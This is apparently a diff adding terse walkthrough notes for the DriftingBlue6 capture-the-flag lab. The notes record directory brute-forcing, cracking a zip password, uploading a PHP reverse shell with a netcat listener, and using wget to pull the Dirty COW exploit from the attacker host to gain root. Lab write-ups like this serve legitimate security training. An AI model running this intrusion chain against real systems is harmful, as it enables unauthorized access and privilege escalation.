@@ -1,0 +1,38 @@
+ DriftingBlue6
+ important link 192.168.56.126/spammer
+ access 192.168.56.127/robots.txt
+important file in zip format
+started bruteforce to find .zip file
+ 
+ gobuster dir -u http://192.168.56.126 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x .zip
+Download spammer.zip
+file is password protected
+zip2john zpammer.zip >zip.txt
+john zip.txt
+get cred.txt
+got username and password 
+login http://192.168.56.126/textpattern/textpattern/
+ upload the reverse_shell.php file
+ 
+ 
+ Find uploaded file here 
+ gobuster dir -u http://192.168.56.126/textpattern/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50
+ /files is important folder
+ 
+ http://192.168.56.126/textpattern/files/
+we opne shell.php
+and start listner on kali Linux nc -nvlp 1234
+
+ uname -a 
+Linux version is lower than 3.9 so vulnerable for dirty cow attack
+
+ 
+ locate linux/local/40839.c
+ cp /usr/share/exploitdb/exploits/linux/local/40839.c .
+ on victim machine
+cd /tmp
+wget http://192.168.56.112:440/40839.c
+gcc -pthread 40839.c -o dirty -lcrypt
+./dirty
+su firefart
+password toor
